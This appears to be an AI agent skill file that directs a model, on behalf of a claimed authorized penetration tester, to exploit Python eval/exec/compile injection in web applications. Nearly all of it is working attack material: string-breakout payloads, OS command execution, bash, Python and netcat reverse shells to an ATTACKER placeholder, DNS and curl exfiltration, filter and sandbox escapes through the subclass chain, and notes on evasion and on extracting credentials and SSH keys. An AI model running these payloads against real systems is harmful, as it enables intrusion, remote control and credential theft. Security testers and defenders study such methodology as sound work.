---
name: python-code-injection
description: >
  Exploit Python eval(), exec(), and compile() injection in web applications.
  Distinct from OS command injection (shell operators) and SSTI (template
  engines) — this targets direct Python code evaluation of user input.
keywords:
  - python eval injection
  - eval() exploit
  - exec() injection
  - python code injection
  - expression injection
  - Searchor exploit
  - python sandbox escape
  - __import__ injection
  - __subclasses__ exploit
  - __builtins__ bypass
  - compile() injection
  - python RCE
tools:
  - burpsuite
  - curl
opsec: medium
---

# Python Code Injection

You are helping a penetration tester exploit Python code injection via eval(),
exec(), or compile(). The target application passes user-controlled input to a
Python code evaluation function without proper sanitization. The goal is to
execute arbitrary Python code and escalate to OS command execution. All testing
is under explicit written authorization.

**This is NOT OS command injection.** Shell operators (`;`, `|`, `&&`) do not
work because the injection context is a Python interpreter, not a shell. You
must write valid Python expressions or statements.

**This is NOT SSTI.** Template injection targets Jinja2/Twig/Freemarker
rendering engines. This skill targets direct eval()/exec() calls in application
code. If `{{7*7}}` returns `49`, route to **ssti-jinja2** or **ssti-twig**
instead. If `{{7*7}}` returns literally but `7*7` evaluates, you're in the
right place.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[python-code-injection] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## Scope Boundary

This skill covers Python code injection through eval(), exec(), and compile()
— from confirming the injection through achieving OS command execution. When
you reach the boundary of this scope — whether through completing your methodology or discovering findings outside your domain —
**STOP**.

Do not load or execute another skill. Do not continue past your scope boundary.
Instead, return to the orchestrator with:
  - What was found (vulns, credentials, access gained)
  - Context to pass (injection point, target, working payloads, etc.)

The orchestrator decides what runs next. Your job is to execute this skill
thoroughly and return clean findings.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
attacks, write custom exploit code, or apply techniques from other domains.
The orchestrator will provide specific guidance or route to a different skill.

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- A parameter that gets passed to Python eval(), exec(), or compile()
- Common vulnerable patterns: search engines (Searchor), calculators, query
  builders, dynamic filters, format string handlers, custom DSLs backed by eval
- Knowledge of the injection context (string argument, numeric, f-string, etc.)

## Step 1: Assess

If not already provided, determine:

1. **Injection function** — eval() (expressions only) vs exec() (statements) vs
   compile() (either)
2. **Injection context** — is input placed inside a string literal, as a bare
   argument, in an f-string, or concatenated into code?
3. **Visible or blind** — is the return value of eval() reflected in the
   response, or is this blind (side-channel only)?
4. **Sanitization** — are any characters filtered? (quotes, parens, underscores,
   dots, brackets)

### Distinguishing eval() from exec()

| Feature | eval() | exec() |
|---------|--------|--------|
| Accepts | Expressions only | Statements and expressions |
| Returns | Expression result | None |
| `import os` | SyntaxError | Works |
| Multi-line | No (single expression) | Yes |
| Assignment (`x=1`) | SyntaxError | Works |

If you can execute `__import__('os')` but not `import os`, it's likely eval().
If both work, it's likely exec() or compile().

### Common Vulnerable Patterns

**Pattern 1: String interpolation into eval** (most common)
```python
# Application code:
result = eval(f"func('{user_input}')")
# Injection: break out of the string, inject code, comment out remainder
```

**Pattern 2: Direct eval of parameter**
```python
# Application code:
result = eval(request.args.get('expr'))
# Injection: any Python expression works directly
```

**Pattern 3: exec() with string building**
```python
# Application code:
exec(f"variable = '{user_input}'")
# Injection: break out of string, inject statements
```

**Pattern 4: eval() in ORM/filter context**
```python
# Application code:
query = eval(f"Model.objects.filter({user_input})")
# Injection: close the filter, chain arbitrary code
```

Skip assessment if context was already provided by web-discovery or the
orchestrator.

## Step 2: Confirm Injection

### Quick Confirmation Probes

Test these in order — the first one that returns an evaluated result (not a
literal echo) confirms eval() injection:

```
# Arithmetic — most universal
7*7
str(7*7)

# String operations
'A'*3
str(type(1))

# Python builtins
str(True)
str(len('test'))
```

**Expected responses for confirmation:**
- `7*7` → `49` (not the literal `7*7`)
- `'A'*3` → `AAA`
- `str(type(1))` → `<class 'int'>`

### Disambiguate from SSTI

If `7*7` returns `49`, also test template syntax to rule out SSTI:

```
{{7*7}}     → if this ALSO returns 49, route to ssti-jinja2 or ssti-twig
${7*7}      → if this returns 49, route to ssti-freemarker
<%= 7*7 %>  → if this returns 49, route to ERB SSTI
```

If template syntax returns literally but bare Python expressions evaluate →
this is eval() injection, not SSTI.

### Error-Based Confirmation

Inject invalid Python to trigger error messages:

```
'
)
(
__import__
```

**Python tracebacks in the response** (`SyntaxError`, `NameError`,
`TypeError`) confirm Python code evaluation. The traceback may also reveal:
- The eval()/exec() call in the stack trace
- The file path of the application
- The full code context around the injection point

## Step 3: Breakout Payloads

The breakout strategy depends on the injection context. Identify which context
you're in, then use the matching payload pattern.

### Context A: Input Inside a String Argument

The most common pattern — your input is placed inside quotes within a function
call:

```python
# Application code:
eval(f"Engine.search('{INJECTION}', copy_url=False)")
```

**Breakout strategy**: Close the string and function call, concatenate your
code, comment out the trailing syntax.

```python
# Payload template:
# CLOSE_STR + CLOSE_PARENS + OPERATOR + CODE + COMMENT

# Read /etc/passwd
test',copy_url=False)+str(open('/etc/passwd').read())#

# Execute OS command
test',copy_url=False)+str(__import__('os').popen('id').read())#

# With named args to satisfy function signature
test',copy_url=False,open_web=False)+str(__import__('os').popen('id').read())#
```

**Adjust the closing syntax to match the context:**

```python
# If inside double quotes:
test",copy_url=False)+str(__import__('os').popen('id').read())#

# If inside parens inside a string:
test'),key=val)+str(__import__('os').popen('id').read())#

# If multiple nested calls:
test'))+str(__import__('os').popen('id').read())#
```

### Context B: Direct Expression Evaluation

Input is passed directly to eval() without wrapping:

```python
# Application code:
result = eval(user_input)
```

**No breakout needed** — inject Python expressions directly:

```python
# OS command execution
__import__('os').popen('id').read()

# File read
open('/etc/passwd').read()

# Reverse shell
__import__('os').system('bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"')
```

### Context C: Numeric/Arithmetic Context

Input expected to be a number in an arithmetic expression:

```python
# Application code:
result = eval(f"{user_input} * price")
```

**Breakout strategy**: Satisfy the arithmetic, then chain code:

```python
# Payload:
1+0 if __import__('os').system('id') else 0
(1).__class__.__bases__[0].__subclasses__()

# With string concatenation to exfiltrate:
str(__import__('os').popen('id').read())+str(0*
```

### Context D: exec() with Statement Injection

If exec() is used, you can inject full Python statements:

```python
# Close the existing statement, inject new ones
'; import os; os.system('id') #
' + ''; import os; os.system('id') #

# Multi-statement via semicolons
a=1; import os; os.system('id')

# Newline injection (if %0a is not filtered)
%0aimport os%0aos.system('id')
```

## Step 4: Command Execution Payloads

Once you can inject arbitrary Python expressions, achieve OS command execution.

### Primary Payloads (use these first)

```python
# popen — returns output (best for visible injection)
__import__('os').popen('id').read()
__import__('os').popen('cat /etc/passwd').read()
__import__('os').popen('whoami').read()

# system — returns exit code only (0 = success)
__import__('os').system('id')
__import__('os').system('bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"')

# subprocess
__import__('subprocess').check_output('id',shell=True).decode()
__import__('subprocess').check_output(['cat','/etc/passwd']).decode()
```

### Wrapping for Visible Output

When the application returns the eval() result, wrap commands to ensure output
is captured:

```python
# Wrap in str() for string coercion
str(__import__('os').popen('id').read())

# Concatenate with expected return value (stealth)
'https://google.com/'+__import__('os').popen('id').read()

# Multiple commands in one injection
str(__import__('os').popen('id && whoami && cat /etc/passwd').read())
```

### Reverse Shell Payloads

```python
# Bash reverse shell
__import__('os').system('bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"')

# Python reverse shell (if bash is restricted)
__import__('os').system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')

# Netcat reverse shell
__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f')
```

### Blind Injection (No Output Reflected)

When eval() result is not returned in the response:

```python
# Time-based confirmation
__import__('time').sleep(5)

# DNS exfiltration
__import__('os').system('host $(whoami).ATTACKER.com')

# HTTP exfiltration
__import__('os').system('curl http://ATTACKER:PORT/$(whoami)')

# File write (retrieve via LFI or directory listing)
__import__('os').system('id > /var/www/html/proof.txt')

# Reverse shell (most practical for blind)
__import__('os').system('bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"')
```

## Step 5: Filter Bypass and Sandbox Escape

### Bypassing Character Filters

**Underscores (`_`) blocked:**

```python
# Use getattr() and chr()
getattr(getattr(__builtins__,chr(95)*2+'import'+chr(95)*2),'os')

# Use globals/locals
globals()[chr(95)*2+'builtins'+chr(95)*2]

# Via string concatenation
getattr('',chr(95)*2+'class'+chr(95)*2)
```

**Dots (`.`) blocked:**

```python
# Use getattr()
getattr(__import__('os'),'popen')('id')

# Use bracket notation on dicts
__import__('os').__dict__['popen']('id')
```

**Quotes (`'`, `"`) blocked:**

```python
# Use chr() to build strings
__import__(chr(111)+chr(115)).popen(chr(105)+chr(100)).read()

# Use bytes decoding
__import__(bytes([111,115]).decode()).popen(bytes([105,100]).decode()).read()

# Use string from existing objects
# 'os' from an exception message, class name, etc.
```

**Parentheses (`(`, `)`) blocked:**

This is severe — most Python code requires parens. Possible workarounds:

```python
# Decorator abuse (exec context only)
@exec
@input
class X:pass
# Then type your payload at the prompt

# List comprehension with side effects
[x for x in [__import__] if x.__call__]
```

**Brackets (`[`, `]`) blocked:**

```python
# Use __getitem__ via getattr
getattr(mylist,'__getitem__')(0)

# Use next(iter()) instead of [0]
next(iter(__import__('os').popen('id')))
```

### Restricted Builtins Bypass

When `__builtins__` is restricted or `__import__` is removed:

**Subclass chain (the universal bypass):**

```python
# Find a subclass that has access to os or subprocess
# Step 1: Get object base class
''.__class__.__mro__[1].__subclasses__()

# Step 2: Find useful subclass (os._wrap_close, subprocess.Popen, etc.)
# Enumerate to find the index:
[x for x in ''.__class__.__mro__[1].__subclasses__() if 'wrap_close' in str(x)]

# Step 3: Use it — os._wrap_close has __init__.__globals__ with os module
''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['popen']('id').read()
```

**Finding the right subclass index:**

```python
# Dump all subclasses with indices
[(i,x) for i,x in enumerate(''.__class__.__mro__[1].__subclasses__()) if 'os' in str(getattr(getattr(x,'__init__',None),'__globals__',{}))]

# Common targets:
# os._wrap_close — has popen, system in __globals__
# subprocess.Popen — direct command execution
# importlib._bootstrap.BuiltinImporter — can import modules
# warnings.catch_warnings — has builtins in __globals__
```

**Compact subclass exploit (finds os._wrap_close automatically):**

```python
[x for x in ''.__class__.__mro__[1].__subclasses__() if 'wrap_close' in str(x)][0].__init__.__globals__['popen']('id').read()
```

**Via __globals__ on any function:**

```python
# Any defined function's __globals__ dict contains builtins
(lambda: 0).__globals__['__builtins__'].__import__('os').popen('id').read()
```

**Via exception handler:**

```python
# Trigger exception, access traceback globals
try:
    raise Exception()
except Exception as e:
    import sys
    tb = sys.exc_info()[2]
    tb.tb_frame.f_globals['__builtins__']['__import__']('os').system('id')
```

### URL Encoding for Web Delivery

When injecting through HTTP parameters, URL-encode special characters:

```
# Spaces: + or %20
# Single quote: %27
# Double quote: %22
# Hash/comment: %23
# Newline: %0a
# Parentheses: %28 %29
```

Use `--data-urlencode` with curl to handle encoding automatically:

```bash
curl -s -X POST http://TARGET/endpoint \
  --data-urlencode "param=PAYLOAD_HERE"
```

## Step 6: Escalate or Pivot

### Credential-Based Access Handoff

When code injection reveals credentials (config files, git repos, environment
variables, database connection strings), write a handoff for the operator:

1. Save discovered credentials to `engagement/evidence/`
2. Write connection commands the operator can run
3. Report in your return summary: credentials and Pivot Map entry
4. Tell the operator: "Credentials found. SSH handoff ready — connect from
   your terminal."

Do NOT attempt to establish SSH/WinRM sessions programmatically from the
injection context — it's fragile and wastes turns debugging interactive auth
issues.

### Reverse Shell

If credentials aren't found but command execution is confirmed:

1. Start a listener on the attackbox: `nc -lvnp PORT`
2. Inject a reverse shell payload from Step 4
3. Stabilize: `python3 -c 'import pty; pty.spawn("/bin/bash")'`

### Routing

- **Shell as non-root on Linux** → STOP. Return to orchestrator recommending
  **linux-discovery**. Pass: hostname, current user, access method
  (injection-based RCE or reverse shell).
- **Shell as non-admin on Windows** → STOP. Return to orchestrator recommending
  **windows-discovery**. Pass: hostname, current user, access method.
- **Found credentials** → report credentials, test against SSH/RDP/WinRM/other
  services. Return to orchestrator recommending the appropriate discovery skill.
- **Blind injection only, no shell** → extract credentials via DNS/HTTP
  exfiltration (file reads: config files, .env, .git/config, SSH keys), then
  use credentials for direct access.

When routing, always pass along: injection point, working payload, target
platform, and any credentials found.

## OPSEC Notes

- eval()/exec() injection generates Python tracebacks on errors — visible in
  application logs
- OS commands via system()/popen() create child processes visible in `ps`
- Reverse shells generate network connections logged by netflow/EDR
- File reads via open() don't create shell processes — lower detection surface
  than os.popen()
- Prefer `open('/path').read()` for file reads over `os.popen('cat /path')` —
  no child process created
- Blind time-based probes (`time.sleep()`) are stealthy — no process creation,
  no network traffic
- URL-encoded payloads are logged in web server access logs in encoded form

## Troubleshooting

### Payload Returns Empty or None

- eval() returns the expression result — use `str()` to coerce to string
- system() returns exit code (int), not output — use `popen().read()` instead
- Check if the application wraps the result (e.g., redirects instead of
  displaying)

### SyntaxError in Response

- You're likely in eval() (expression-only) and injected a statement (import,
  assignment). Use `__import__()` instead of `import`, use walrus operator
  `:=` instead of `=` (Python 3.8+)
- Check quoting context — are you inside single quotes, double quotes, or
  unquoted?
- Count your parentheses — unbalanced parens cause SyntaxError

### NameError: __import__ Not Defined

- `__builtins__` may be restricted. Use the subclass chain (Step 5)
- Try `__builtins__.__import__` explicitly
- Try `getattr(__builtins__, '__import__')`
- If `__builtins__` is a dict (not module): `__builtins__['__import__']`

### Input is Truncated

- Web parameter length limits. Try POST instead of GET
- Use shorter payloads: `__import__('os').system('id')` is shorter than
  `__import__('subprocess').check_output('id',shell=True).decode()`
- For very tight limits, stage: write a short file downloader, then download
  and execute a full payload

### Application Crashes After Injection

- The injected code may cause an unhandled exception. Wrap in try/except:
  `(lambda:(__import__('os').popen('id').read()))()` or ensure your payload
  produces a value the application can handle
- If using `#` to comment out trailing code, ensure there's no critical cleanup
  being skipped (connection closing, transaction commits)

### Can Execute Code but No External Network Access

- Target may be in an isolated network. Use the injection for file reads to
  extract credentials, then pivot via SSH/internal services
- Write results to a web-accessible path and retrieve via HTTP
- Use the injection as a webshell equivalent: script repeated curl calls to
  execute commands and retrieve output
